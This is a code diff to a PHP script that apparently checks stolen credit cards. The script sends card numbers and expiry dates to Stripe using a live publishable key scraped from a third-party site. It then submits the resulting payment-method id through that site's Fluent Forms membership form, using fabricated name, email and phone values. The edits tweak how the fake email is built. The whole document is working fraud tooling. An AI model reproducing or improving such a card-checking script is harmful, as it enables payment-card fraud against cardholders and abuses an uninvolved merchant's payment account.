@@ -85,7 +85,6 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=7087376c-dbb2-4568-834b-165223143665764379&sid=96468abf-e91c-44c2-80af-76573840b91188be16&pasted_fields=number&payment_user_agent=stripe.js%2F65b2ba26d0%3B+stripe-js-v3%2F65b2ba26d0%3B+card-element&referrer=https%3A%2F%2Flimitlessflowposing.com&time_on_page=146002&key=pk_live_51MyCQkKq1yP3KvSUU0Gf5ydVtq6MPmZiORQgOAyblzRlS9QGoX0QBsu5qyhd3IXy3UPtNILNmkIwbvpRkpUukcFS00W0Sy8AJG');
 
 $result1 = curl_exec($ch);
-$crt = trim(strip_tags(getStr($result1,'"created": "','"')));
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 # -------------------- [2 REQ] -------------------#
@@ -126,7 +125,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D2714%26_fluentform_15_fluentformnonce%3De39aa6cba5%26_wp_http_referer%3D%252Fcommunity-membership-site%252F%26name%255Bfirst_name%255D%3DGloosmoke%26email%3Dgloosmoke'.$crt.'%2540gmail.com%26phone%3D%252B66817480671%26input_text_2%3Dgaungyellhtet%26input_text_3%3DGoogle%26input_text_4%3DNY%26input_text%3DNY%26input_text_5%3DNY%26input_text_6%3DNY%26input_text_7%3DNY%26input_text_8%3DNY%26input_text_9%3DNY%26input_text_10%3DNY%26payment_input%3D0%26payment-coupon%3D%26payment_method%3Dstripe%26__ff_all_applied_coupons%3D%26__entry_intermediate_hash%3Df44e0152a81928537d060eb2542a8216%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=15');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D2714%26_fluentform_15_fluentformnonce%3De39aa6cba5%26_wp_http_referer%3D%252Fcommunity-membership-site%252F%26name%255Bfirst_name%255D%3DGloosmoke%26email%3D'.$id.'%2540gmail.com%26phone%3D%252B66817480671%26input_text_2%3Dgaungyellhtet%26input_text_3%3DGoogle%26input_text_4%3DNY%26input_text%3DNY%26input_text_5%3DNY%26input_text_6%3DNY%26input_text_7%3DNY%26input_text_8%3DNY%26input_text_9%3DNY%26input_text_10%3DNY%26payment_input%3D0%26payment-coupon%3D%26payment_method%3Dstripe%26__ff_all_applied_coupons%3D%26__entry_intermediate_hash%3Df44e0152a81928537d060eb2542a8216%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=15');
 
 $result2a = curl_exec($ch);
 
